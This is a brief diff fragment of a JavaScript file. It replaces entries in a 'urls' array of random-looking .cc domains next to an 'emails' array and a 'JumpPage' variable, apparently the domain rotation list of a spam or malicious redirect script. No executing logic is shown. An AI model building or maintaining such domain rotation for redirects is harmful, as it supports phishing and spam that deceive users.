@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
-	'rxzfszht.cc/', 
-	'ediayikma.cc/', 
-    'agdkczeyx.cc/',
+	'xgxfllwsi.cc/', 
+	'zxzddtzt.cc/', 
+    'ediayikma.cc/',
 ];                                                                                                                  
 
 var JumpPage="";
